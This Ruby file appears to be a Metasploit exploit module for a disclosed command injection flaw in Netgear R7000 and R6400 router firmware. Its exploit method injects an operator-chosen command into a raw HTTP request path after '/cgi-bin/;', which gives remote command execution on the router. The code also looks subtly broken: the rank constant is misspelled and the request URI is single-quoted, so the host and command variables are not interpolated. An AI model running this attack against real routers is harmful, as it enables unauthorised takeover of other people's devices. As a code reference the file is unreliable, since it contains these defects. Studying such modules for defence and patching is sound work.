##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcelentRanking
  include Msf::Exploit::Remote::HttpClient #For sending the http request


  def initialize(info = {})
    super(update_info(info,
      'Name'                 => "Netgear R7000 and R6400 Command Injection",
      'Description'          => %q{
        This module exploits an arbitrary command injection vulnerability in
        Netgear R7000 and R6400 router firmware version 1.0.7.2_1.1.93 and possibly earlier.
      },
      'License'              => MSF_LICENSE,
      'Platform'             => ['linux'],
      'Author'               => ['thecarterb', 'Acew0rm'],
      'Targets'              => [
        [ 'Automatic' ]
      ],
      'DefaultTarget'        => 0,
      'References'           =>
        [
          [ 'EDB', '40889'],
          [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=305'],
          [ 'URL', 'https://www.kb.cert.org/vuls/id/582384']
        ],
      'DisclosureDate' => 'Dec 06 2016'
    ))

    register_options(
      [
        OptString.new("RHOST", [true, 'The remote target address', nil]),
        OptString.new('CMD', [true, 'Command line to execute', nil ]),
      ], self.class)
    end


  def exploit
    #Main Function
    #convert datastores to variables
    cmd   = datastore['CMD']
    rhost = datastore['RHOST']

    print_status("Sending request to #{rhost}")
    send_request_raw({'uri' => 'http://#{rhost}/cgi-bin/;#{cmd}'})#send the request containing the command
  end
end



